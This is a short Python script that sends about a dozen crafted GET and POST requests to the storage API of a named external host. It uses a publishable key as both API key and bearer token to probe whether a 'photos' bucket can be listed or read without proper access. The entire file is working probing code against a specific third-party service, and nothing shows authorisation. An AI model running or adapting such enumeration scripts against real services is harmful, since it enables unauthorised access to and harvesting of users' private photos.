import ssl, json, urllib.request, urllib.error

BASE = "https://cdn.onlyfakeai.ru"
KEY = "<publishable-key>"
ctx = ssl.create_default_context()

def req(method, path, body=None, extra=None, timeout=20):
    h = {
        "User-Agent": "Mozilla/5.0",
        "apikey": KEY,
        "Authorization": f"Bearer {KEY}",
    }
    if extra:
        h.update(extra)
    data = json.dumps(body).encode() if body is not None else None
    r = urllib.request.Request(BASE + path, data=data, headers=h, method=method)
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "ignore")
    except Exception as e:
        return 0, str(e)

print("=== photos bucket listing variants ===")
variants = [
    ("GET", "/storage/v1/object/photos?limit=100&offset=0"),
    ("GET", "/storage/v1/object/list/photos?limit=100&offset=0"),
    ("GET", "/storage/v1/object/list/photos"),
    ("POST", "/storage/v1/object/list/photos", {"prefix": "", "limit": 100, "offset": 0}),
    ("POST", "/storage/v1/object/list/photos", {}),
    ("GET", "/storage/v1/object/photos/?limit=100"),
    ("GET", "/storage/v1/object/public/photos?limit=100"),
    ("GET", "/storage/v1/object/photos/0"),
    ("GET", "/storage/v1/object/photos/.emptyFolderPlaceholder"),
    ("GET", "/storage/v1/object/photos/.emptyFolderPlaceholder?limit=100"),
    ("GET", "/storage/v1/object/sign/photos/.emptyFolderPlaceholder"),
]
for m, p, *rest in [tuple(x) if isinstance(x, tuple) else (x[0], x[1]) for x in variants]:
    body = rest[0] if rest else None
    st, txt = req(m, p, body=body)
    print(f"{m} {p} -> {st}")
    print("   ", txt[:300].replace("\n", " ")[:300])
